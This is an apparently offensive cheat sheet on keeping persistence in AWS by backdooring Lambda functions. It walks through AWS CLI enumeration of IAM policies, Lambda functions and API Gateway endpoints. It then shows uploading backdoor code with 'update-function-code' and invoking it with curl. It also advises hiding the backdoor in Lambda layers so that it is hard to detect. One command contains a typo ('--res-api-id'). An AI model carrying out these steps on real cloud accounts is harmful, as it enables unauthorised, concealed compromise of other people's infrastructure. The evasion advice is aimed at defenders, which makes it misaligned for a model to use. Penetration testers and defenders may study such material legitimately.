# AWS Lambda and API Gateway Persistence

### If the user has sufficient rights in the lambda function, its possible to download the source code, add a backdoor to it and upload. Everytime the lambda executes, the malicious code will also execute.

### Always try to update the code of layers (dependencies) instead of the actual lambda code, this way our backdoor will be difficult to detect.

#### 1) Checking which user is executing

    aws sts get-caller-identity 

#### 2) Checking all managed policies attached to the user

    aws iam list-attached-user-policies --user-name USER_NAME 

#### 3) Checking information about a specific policy

    aws iam get-policy-version --policy-arn ARN --version-id ID 

#### 4) Listing all lambda functions

    aws lambda list-functions --region REGION 

#### 5) Listing information about the specified lambda

    aws lambda get-function --function-name NAME 

### Download and analyze the code, then:

    aws lambda get-policy --function-name NAME --profile PROFILE --region REGION

### We can grab informations like id, who can invoke and other details with this command (Helps to build the query to execute the lambda function).

#### 6) Listing Rest APIs

    aws apigateway get-rest-apis 

#### 7) Listing information about a specific API

    aws apigateway get-rest-api --rest-api-id ID 

#### 8) Listing information about endpoints

    aws apigateway get-resources --rest-api-id ID

#### 9) Listing information about a specific endpoint
   
    aws apigateway get-resource --rest-api-id ID --resource-id ID 

#### 10) Listing method information for the endpoint (Test various methods to see if the API supports it)

    aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method METHOD 

#### 11) List all versions of a rest API

    aws apigateway get-stages --rest-api-id ID 

#### 12) Getting information about a specific version

    aws apigateway get-stage --res-api-id ID --stage-name NAME 

#### 13) Uploading the backdoor code to aws lambda function

    aws lambda update-function-code --function-name FUNCTION --zip-file fileb://my-function/EXAMPLE 

#### 14) Invoke the function

    curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE

### Where:

#### 1. API-ID -> uj3948ie

#### 2. Region -> us-east-2

#### 3. Resource (Endpoint) -> EXAMPLE

#### 4. Method -> Get

#### 5. Stage (Version) -> default

#### 6. API-Key -> None

### All these details are gathered during enumeration
